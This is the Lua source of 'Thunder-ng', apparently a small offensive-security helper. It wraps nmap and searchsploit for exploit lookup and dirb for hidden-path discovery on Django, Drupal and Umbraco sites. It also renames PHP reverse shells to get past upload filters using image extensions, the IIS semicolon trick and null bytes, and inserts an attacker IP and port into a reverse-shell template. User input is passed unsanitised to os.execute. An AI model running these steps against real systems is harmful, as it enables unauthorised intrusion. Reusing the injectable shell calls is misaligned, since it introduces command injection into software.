--[[

MIT License

Copyright (c) 2022 BugAlpha

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.


]]

print("Welcome To Thunder-ng")
-- Show the help menu if arg[2] is -h
function help()
	if ( arg[1] == "-h" )
	then
		print("Help Menu:")
		print("-h   	| shows this help and exit")
		print("-exp 	| Search For available exploits based on version numbers scans")
		print("--hidden | Search for hidden content usage [ lua main.lua --hidden <CMS name> ] or  [ lua main.lua --hidden raw]")
	elseif ( arg[1] == nil or arg[1] == '' )
	then
		print("Help Menu:")
		print("-h   	| shows this help and exit")
		print("-exp 	| Search For available exploits based on version numbers scans")
		print("--hidden | Search for hidden content usage [ lua main.lua --hidden <CMS name> ] or  [ lua main.lua --hidden raw]")
	end
end
-- Search for exploits available
function exploits_searcher ()
	if ( arg[1] == "-exp" )
	then
		io.write("Please give an ip address : ")
		local ip = io.read()
		local nmap_scan = os.execute("nmap -Pn -sV " .. ip .. " -oX results/nmap_" .. os.date("%m.%d.%Y") .. ".xml" )
		local sp_scan = os.execute("searchsploit -x --nmap results/nmap_" .. os.date("%m.%d.%Y") .. ".xml" )
	end
end
function hidden_content_hunt()
	if ( arg[1] == "--hidden" and arg[2] == "django" )
	then
		io.write("Please give an ip address : ")
		local ip = io.read()
		local wordlist = "wordlists/Django.txt"
		local dirb_scan = os.execute("dirb http://" .. ip .. " " .. wordlist .. " | grep -e \"200\" -e \"DIRECTORY\" > results/django_" .. os.date("%m.%d.%Y") .. ".txt && cat results/django_" .. os.date("%m.%d.%Y") .. ".txt")
		print("[*] Saved to results/django_" .. os.date("%m.%d.%Y") .. ".txt")
	elseif ( arg[1] == "--hidden" and arg[2] == "raw")
	then
		io.write("Please give an ip address : ")
		local ip = io.read()
		io.write("Do you have a wordlist? give me the path or hit y to use default : ")
		local i = io.read()
		if ( i == "y" or i == "Y" )
		then
			local wordlist = "wordlists/common.txt"
			local dirb_scan = os.execute("dirb http://" .. ip .. " " .. wordlist .. " | grep -e \"200\" -e \"DIRECTORY\" > results/hiddencontent_" .. os.date("%m.%d.%Y") .. ".txt && cat results/hiddencontent_" .. os.date("%m.%d.%Y") .. ".txt")
			print("[*] Saved to results/hiddencontent_" .. os.date("%m.%d.%Y") .. ".txt")	
		else
			local wordlist = i
			local dirb_scan = os.execute("dirb http://" .. ip .. " " .. wordlist .. " | grep -e \"200\" -e \"DIRECTORY\" > results/hiddencontent_" .. os.date("%m.%d.%Y") .. ".txt && cat results/hiddencontent_" .. os.date("%m.%d.%Y") .. ".txt")
			print("[*] Saved to results/hiddencontent_" .. os.date("%m.%d.%Y") .. ".txt")	
		end

	elseif ( arg[1] == "--hidden" and arg[2] == "drupal")
	then
		io.write("Please give an ip address : ")
		local ip = io.read()
		local wordlist = "wordlists/Drupal.txt"
		local dirb_scan = os.execute("dirb http://" .. ip .. " " .. wordlist .. " | grep -e \"200\" -e \"DIRECTORY\" > results/drupal_" .. os.date("%m.%d.%Y") .. ".txt && cat results/drupal_" .. os.date("%m.%d.%Y") .. ".txt")
		print("[*] Saved to results/drupal_" .. os.date("%m.%d.%Y") .. ".txt")
	elseif ( arg[1] == "--hidden" and arg[2] == "umbraco")
	then
		io.write("Please give an ip address : ")
		local ip = io.read()
		local wordlist = "wordlists/Umbraco.txt"
		local dirb_scan = os.execute("dirb http://" .. ip .. " " .. wordlist .. " | grep -e \"200\" -e \"DIRECTORY\" > results/umbraco_" .. os.date("%m.%d.%Y") .. ".txt && cat results/umbraco_" .. os.date("%m.%d.%Y") .. ".txt")
		print("[*] Saved to results/umbraco_" .. os.date("%m.%d.%Y") .. ".txt")
	end
end
function reverse_shell()
	if ( arg[1] == "-rv" and arg[2] == "--bypass" )
	then
		print("Select what you want to byass file upload on")
		print("1-PHP")
		io.write("->: ")
		local i = io.read()
		if ( i == "1" ) 
		then
			print("Please The path to you reverse shell")
			io.write("->: ")
			local reverse_shell_path = io.read()
			print("Select which Method you want to use : ")
			print("1-Change File extension To an image")
			print("2-IIS 6 semi-colon bypass")
			print("3-null character injection")
			print("4-Change Exif data (Soon)")
			io.write("->: ")
			local i = io.read()
			if ( i == "1" )
			then
				os.execute("mv " .. reverse_shell_path .. " results/" .. reverse_shell_path .. ".jpg")
				print("[*] Payload was saved to results/" .. reverse_shell_path .. ".jpg")
			end
			if ( i == "2" )
			then
				os.execute("mv " .. reverse_shell_path .. " results/" .. "'" ..reverse_shell_path .. "'" .. "';.jpg'")
				print("[*] Payload was saved to results/" .. reverse_shell_path .. "';.jpg'")
			end
			if ( i == "3" )
			then
				os.execute("mv " .. reverse_shell_path .. " results/" .. "'" .. reverse_shell_path .. "'" .. "'%00.jpg'" )
				print("[*] Payload was saved to results/" .. "'" .. reverse_shell_path .. "'" .. "'%00.jpg'")
			end
		end
	end	
	if ( arg[1] == "-rv" and arg[2] == "--generator" )
	then
		print("Please give your ip address (If your attack is local give your local address else give your public ip)")
		io.write("->: ")
		ip   = io.read()
		print("Please provide a port number")
		io.write("->: ")
		port = io.read()
		print("What you name you want to give to the reverse shell (Make sure you add .php at the end)")
		io.write("->: ")
		path = io.read()
		os.execute("sed -i \'49s/.*/$ip = " .. "'" .. ip .. "'" .. ";/\' reverse_shells/php-reverse-shell.php && " .. " sed -i \'50s/.*/$port = " .. "'" .. port .. "'" .. ";/\' reverse_shells/php-reverse-shell.php && cat reverse_shells/php-reverse-shell.php > " .. path)
		print("[:)] Done!")
		print("[*] Saved to " .. path )
	end
end
help()
exploits_searcher()
hidden_content_hunt()
reverse_shell()